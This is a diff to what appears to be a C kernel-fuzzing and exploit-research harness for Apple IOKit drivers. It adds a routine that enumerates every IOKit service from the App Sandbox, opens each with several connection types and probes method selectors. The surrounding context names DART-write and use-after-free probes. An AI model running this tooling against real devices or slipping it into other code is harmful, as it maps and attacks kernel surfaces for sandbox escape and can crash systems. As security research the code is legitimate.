@@ -15746,6 +15746,85 @@ static void p_dartwrite(void) {
     LOG("[dartw] done (alive)");
 }
 
+// V97: full IOKit attack-surface sweep from the App Sandbox. Enumerate every
+// registry service (name|class|path), probe IOServiceOpen types 0..3, then
+// selector-probe 0..20 (struct 0x80 zeros) on whatever opens.
+// FUZZ_IOSWEEP_SKIP=<name> resumes past a killer service.
+static void p_iosweep(void) {
+    LOG("[sweep] v97: full IOKit surface sweep");
+    const char *skipname = getenv("FUZZ_IOSWEEP_SKIP");
+    io_iterator_t it = 0;
+    kern_return_t kr = IOServiceGetMatchingServices(kIOMainPortDefault,
+                            IOServiceMatching("IOService"), &it);
+    if (kr || !it) { LOG("[sweep] enumeration failed 0x%x", kr); return; }
+    // collect first (opening while iterating is fine, but keep it simple)
+    static char names[1500][128];
+    int nsvc = 0;
+    io_registry_entry_t e;
+    while ((e = IOIteratorNext(it)) && nsvc < 1500) {
+        io_name_t nm, cl; char path[512];
+        IORegistryEntryGetName(e, nm);
+        IOObjectGetClass(e, cl);
+        path[0] = 0;
+        IORegistryEntryGetPath(e, kIOServicePlane, path);
+        LOG("[sweep] svc: %s | %s | %s", nm, cl, path);
+        strlcpy(names[nsvc++], nm, 128);
+        IOObjectRelease(e);
+    }
+    IOObjectRelease(it);
+    LOG("[sweep] enumerated %d services", nsvc);
+
+    static const char *known[] = { "AGXAcceleratorG16P", "AppleM2ScalerCSCDriver",
+        "IOSurfaceRoot", "AppleJPEGDriver", "IOMobileFramebufferAP", NULL };
+    uint8_t *inb = must_map(0x1000);
+    uint8_t *outb = must_map(0x1000);
+    for (int i = 0; i < nsvc; i++) {
+        if (skipname && !strcmp(names[i], skipname)) {
+            LOG("[sweep] SKIP %s (env)", names[i]);
+            continue;
+        }
+        int isknown = 0;
+        for (int k = 0; known[k]; k++) if (!strcmp(names[i], known[k])) isknown = 1;
+        int opened[8]; int no = 0;
+        for (uint32_t t = 0; t <= 3 && no < 8; t++) {
+            io_service_t s = IOServiceGetMatchingService(kIOMainPortDefault,
+                                IOServiceMatching(names[i]));
+            if (!s) break;
+            io_connect_t c = 0;
+            kern_return_t ko = IOServiceOpen(s, mach_task_self(), t, &c);
+            IOObjectRelease(s);
+            if (!ko && c) opened[no++] = t;
+            else if (c) IOServiceClose(c);
+        }
+        if (!no) continue;
+        char tb[64] = "";
+        for (int k = 0; k < no; k++) { char t2[12]; snprintf(t2, 12, "%s%u", k ? "," : "", opened[k]); strlcat(tb, t2, 64); }
+        LOG("[sweep] REACHABLE: %s types=%s%s", names[i], tb, isknown ? " (known)" : "");
+        // selector probe on the lowest type
+        io_service_t s = IOServiceGetMatchingService(kIOMainPortDefault,
+                            IOServiceMatching(names[i]));
+        io_connect_t c = 0;
+        kern_return_t ko = s ? IOServiceOpen(s, mach_task_self(), opened[0], &c) : -1;
+        if (s) IOObjectRelease(s);
+        if (ko || !c) continue;
+        char live[256] = "";
+        for (uint32_t sel = 0; sel <= 20; sel++) {
+            memset(inb, 0, 0x1000); memset(outb, 0, 0x1000);
+            size_t osz = 0x100;
+            kern_return_t k2 = IOConnectCallStructMethod(c, sel, inb, 0x80, outb, &osz);
+            if (k2 != 0xe00002c2) {
+                char t2[24];
+                snprintf(t2, 24, " sel%u=%08x", sel, k2);
+                strlcat(live, t2, 256);
+            }
+        }
+        LOG("[sweep]   %s methods:%s", names[i], live[0] ? live : " none(0x2c2)");
+        IOServiceClose(c);
+        usleep(5000);
+    }
+    LOG("[sweep] done (alive)");
+}
+
 static void p4b_uaf2(void) {
     LOG("[v13-d] UAF destroy-first (panic tolerated)");
     IOSurfaceRef big1 = make_surface(2048, 2048);
@@ -15876,6 +15955,7 @@ void *t_iosurface_scaler(void *arg) {
     static int probed = 0;
     if (!probed) {
         probed = 1;
+        if (getenv("FUZZ_IOSWEEP")) { p_iosweep(); LOG("[probe13] iosweep-only mode, stop"); return NULL; }
         if (getenv("FUZZ_DARTWRITE")) { p_dartwrite(); LOG("[probe13] dartwrite-only mode, stop"); return NULL; }
         if (getenv("FUZZ_DARTVAL")) { p_dartval(); LOG("[probe13] dartval-only mode, stop"); return NULL; }
         if (getenv("FUZZ_DARTAIM")) { p_dartaim(); LOG("[probe13] dartaim-only mode, stop"); return NULL; }
